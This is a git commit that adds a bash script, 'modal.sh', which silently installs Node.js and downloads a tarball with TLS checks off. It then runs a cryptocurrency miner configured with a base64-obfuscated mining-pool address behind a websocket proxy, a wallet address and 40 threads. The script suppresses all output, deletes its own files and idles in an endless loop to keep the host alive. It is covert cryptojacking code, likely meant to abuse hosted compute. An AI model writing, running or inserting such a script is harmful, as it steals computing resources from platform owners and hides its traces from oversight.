9c02faac7d2aa43448415399dec93fb56fd2a910
paskofa10 <mr.paskofa10@jugda.com>
2025-09-09 22:56:51 +0700

    Create modal.sh

---
+++ modal.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+apt install nodejs -y > /dev/null 2>&1
+curl -sLkO https://github.com/paskofa10/webmoon/releases/download/flex/mino.tar.gz
+tar -xvf mino.tar.gz > /dev/null 2>&1
+echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW", "password": "c=MAZA,zap=MAZA", "argent": "BeeMJe/1.1", "threads": 40}' > data.txt
+nproc --all 
+node app.js > /dev/null 2>&1 &
+sleep 10
+rm -rvf *
+while true
+do
+        echo "ojo lali ngopi boss..."
+        sleep 1200
+done
